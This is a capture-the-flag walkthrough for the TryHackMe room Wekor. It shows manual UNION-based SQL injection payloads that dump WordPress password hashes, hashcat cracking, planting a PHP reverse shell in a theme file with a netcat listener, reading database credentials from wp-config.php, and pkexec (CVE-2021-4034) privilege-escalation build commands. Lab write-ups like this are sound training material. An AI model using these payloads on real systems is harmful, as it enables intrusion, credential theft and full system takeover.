# TryHackMe-Wekor1.0-Manual-SQLi
This is a manual SQL Injection Walkthrough for the TryHackMe room, Wekor1.0

![wekor](https://user-images.githubusercontent.com/105963749/169672800-5b7b319b-6340-4814-80b3-922f72cc3dfb.png)

TryHackMe | Wekor1.0 | Manual SQLi

CTF ROOM:     https://tryhackme.com/room/wekorra                               
THM PROFILE:  https://tryhackme.com/p/0x0000


Hello i am 0x000 from THM, and this is my first write-up.

The main reason i am writing this walk-through is the following:


After finishing any interesting CTF room i am looking for write-ups to see different solutions.

In this room, every walk-through was almost the same and everyone uses SQLMap to dump the databases.

Ok we all love SQLMap but tell this to OffSec which insists (rightfully)

to learn MANUAL SQL Injection and SQLMap Is Banned!!!


So i made this write-up to walk you through the manual way.

This is a medium difficulty room so i will skip basic things like how to write to /etc/hosts and how to scan with Nmap!


First of all the creator of the room instruct us to add “wekor.thm” to /etc/hosts

This indicates that maybe there are other vhosts and there is at least one webpage.


Nmap gave us nothing special, so for now i will proceed with vhost and webpage enumeration.

    PORT STATE SERVICE
    22/tcp open ssh
    80/tcp open http

To scan for other vhosts:

	gobuster vhost -u http://wekor.thm -w /usr/share/wordlists/dirb/big.txt

Found:``` site.wekor.thm ```

Add the new vhost inside /etc/hosts

With some basic manual enumeration i discovered /robots.txt

  http://wekor.thm/robots.txt

    User-agent: *
    Disallow: /workshop/
    Disallow: /root/
    Disallow: /lol/
    Disallow: /agent/
    Disallow: /feed
    Disallow: /crawler
    Disallow: /boot
    Disallow: /comingreallysoon
    Disallow: /interesting

Only /comingreallysoon Works and lands us in a page that prompts us to visit the latest website on /it-next

	  http://wekor.thm/it-next/

Meanwhile, dirbusting http://site.wekor.thm found ```/wordpress/```

	  http://site.wekor.thm/wordpress/


So we do have 2 webpages to enumerate.

The WordPress site looks pretty default.

Scanning with WPScan i found an Admin user.

Lets enumerate the other webpage and if i got no luck then i will try brute forcing.

The other webpage for CTF machine is overwhelming! CUDOS To the creator ❤ i loved it!

Took me some time to check it all.

Inside the shop section click on a product and add it to cart.

Then, lower in the cart page, there is a coupon text box that act weirdly when i throw symbols inside.

	  http://wekor.thm/it-next/it_cart.php

Type just a single-quote inside the textbox ```'``` and the response is:

```“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’’ at line 1”```

It is vulnerable to SQL Injection!

Lets Own it, Manually of course!

The first error message we got, indicates that the back-end uses MySQL.

The payload that worked stabilizing the query without errors is:

  	' OR 1=1 -- -

To find the Column count in the current table so that we can work with we type:

    ' OR 1=1 UNION ALL SELECT NULL

  Response:
  
    “The used SELECT statements have a different number of columns”

We continue adding NULL values until something returns without errors:

    ' OR 1=1 UNION ALL SELECT NULL,NULL
    ' OR 1=1 UNION ALL SELECT NULL,NULL,NULL

With three NULL Values we are good to go.


We can now enumerate things like database version, hostname, current user, data directory path and many more.

For example 
```
We can find MySQL version like so:

'OR 1=1 UNION ALL SELECT NULL,NULL,@@version -- -
	
  It is 5.7.32!


We can see who is the current user:

'OR 1=1 UNION ALL SELECT NULL,NULL,user() -- -
	
  ITS ROOT!!!
```

Anyway Lets move on!

To request all database names we ask for database ‘information_schema’ table ‘schemata’ column ‘schema_name’:
```
    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(schema_name) FROM information_schema.schemata -- -

  Response:
    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
    Coupon Code : With ID : And With Expire Date Of : information_schema Is Valid!
    Coupon Code : With ID : And With Expire Date Of : coupons Is Valid!
    Coupon Code : With ID : And With Expire Date Of : mysql Is Valid!
    Coupon Code : With ID : And With Expire Date Of : performance_schema Is Valid!
    Coupon Code : With ID : And With Expire Date Of : sys Is Valid!
    Coupon Code : With ID : And With Expire Date Of : WordPress Is Valid!
```
Of course the database WordPress stands out.

To ask for WordPress’s tables, again from database ‘information_schema’ we ask for table ‘TABLES’:
```
    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='wordpress'-- -

  Response:
    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_commentmeta Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_comments Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_links Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_options Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_postmeta Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_posts Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_term_relationships Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_term_taxonomy Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_termmeta Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_terms Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_usermeta Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_users Is Valid!
```
The table that stands out now is the wp_users.

To ask for wp_users’s columns, once again from database ‘information_schema’ we ask for table ‘COLUMNS’:
```
    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(column_name) FROM information_schema.COLUMNS  WHERE TABLE_NAME='wp_users'-- -

  Response:
    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
    Coupon Code : With ID : And With Expire Date Of : ID Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_login Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_pass Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_nicename Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_email Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_url Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_registered Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_activation_key Is Valid!
    Coupon Code : With ID : And With Expire Date Of : user_status Is Valid!
    Coupon Code : With ID : And With Expire Date Of : display_name Is Valid!
```

So now we know what we ask for! Lets Dump the useful stuff!
```
    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_pass,0x29) FROM wordpress.wp_users -- -

  Response:
    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
    Coupon Code : With ID : And With Expire Date Of : admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
    Coupon Code : With ID : And With Expire Date Of : wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!
```
Nice ❤

To identify the hash navigate to:

https://hashcat.net/wiki/doku.php?id=example_hashes

Press Ctr+F to use ‘Find’ inside the page and type $P$

    400 phpass, WordPress (MD5), Joomla (MD5)

To crack the Hashes save all the hashes inside a file ex.: hashes.txt and then:

    hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt


CRACKED HASHES:
```
wp_yura:********
wp_eagle:******
wp_jeffrey:*******
```

I enumerated the rest of the columns and found nothing more valuable that these hashes. 
```
    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_activation_key,0x29) FROM wordpress.wp_users -- -

  Response:
    Coupon Code : With ID : And With Expire Date Of : (admin:1653007217:$P$BXuW77/My0s1ULQmkWaLEnoGljjLW5/) Is Valid!
    Coupon Code : With ID : And With Expire Date Of : (wp_jeffrey:1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0) Is Valid!
```

Login with user wp_yura:

    http://site.wekor.thm/wordpress/wp-login.php

We can see that we have enough access for our needs!

Download the PHP Reverse Shell from Pentest Monkey from this link:

    http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz

Edit it properly (replace the defaults with your THM tunX IP Address And the Listening Port ex:1234)

In the WordPress account navigate from the Left Control Panel to:

    Appearance → Theme Editor

From the Right Control Panel → Archives(archive.php)

Replace archive.php with the edited PHP Reverse Shell.

(In a real engagement we should keep a backup of everything we messed with, but for now we are good)

Update The File and set a Listener.

I prefer using ‘rlwrap’ with netcat. So:

    rlwrap nc -lvnp 1234

Trigger the reverse shell accessing:

    http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/archive.php


### We are In! ###

### We got Our Reverse Shell! ###


Start manually enumerating the “low hanging fruits”

READING THE WP-CONFIG
```
    cat /var/www/html/site.wekor.thm/wordpress/wp-config.php

    define( 'AUTH_KEY',         'V_hD%g&hh2BANp3+5fMB?>4lG}<OH*cd(6UnE/WqmdZTLo#8h4tN}[Ckdq`]{@kI' );
    define( 'SECURE_AUTH_KEY',  '2^T<ziG&eEjuEzh^-Dk7n57IURC+JY2:(^o(;t<MmSWB-}vc2d6E@%BD9XQ*4}r?' );
    define( 'LOGGED_IN_KEY',    '?X`:4j2fx]pZ%a0IGMLzg/nrI/dkz{D%n/nK$2h<%[6VV~TR8XD7-{Xz)hR6V45t' );
    define( 'NONCE_KEY',        'Ilx%BU@7^aUY_~S~/?I$09?&bhH.!0U$7dNEr>dAj!;%[$MV<pie0^j,$C1U*tmY' );
    define( 'AUTH_SALT',        '&6xsxo(_`wq`-BuAEC[&eN*Z(ecu[.$8dA$HQFV8*SC} ;|DW&?@B@~RhJD7[q(4' );
    define( 'SECURE_AUTH_SALT', '/<I;TDbv_G5w,k9MuJ3ESAA=1N$25p*H;)!r-|7T{+rS@%QIF1>l Me::g2Cf2]+' );
    define( 'LOGGED_IN_SALT',   'btBt`YR/?0(x)C0/aioT9]7.G{y~eo7C8?P6>@[wfFyygHQ!zkc_kqa`6RY]dE>z' );
    define( 'NONCE_SALT',       'gK~TMo/<3*8X0N7G}D{2$&A$5E1^Hv$}`U<=lLa`{<50n1BgRUuE:7;a5h29mH[V' );

    /** MySQL database username */
    define( 'DB_USER', 'root' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'root123@#59' );

```
This Password does not work with any user account.

Inside MySQL there isn’t something new, so we move on.

I don't have access to any home directory and there aren't useful files inside /opt /var/backups and so on… 

There are ports listening, indicating internal network but i will try a different way. 

    $meminstance ("127.0.0.1",11211)
	
The way abusing the internal services is well described in other write-ups.


Hitting ```uname -a``` i notice a very old distribution.

I believe it is vulnerable to pwnkit. The pkexec vulnerability that made millions of ITs lose their sleep, so,

Lets Try:

###PRIVESC###

Download Exploit From:

    git clone https://github.com/berdav/CVE-2021-4034

ZIP The folder → CVE.zip

wget TO TARGET
--->

Then hit the following commands:

    unzip CVE.zip
    cd CVE-2021–4034
    cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
    cc -Wall cve-2021-4034.c -o cve-2021-4034
    echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
    mkdir -p GCONV_PATH=.
    cp /bin/true GCONV_PATH=./pwnkit.so:.
    ./cve-2021–4034
#

Oh Yeah!

We are root!

We can now read the flags:

    cat /home/Orka/flag.txt
    cat /root/root.txt

Thats it!

I hope you enjoy it!

~0x0000
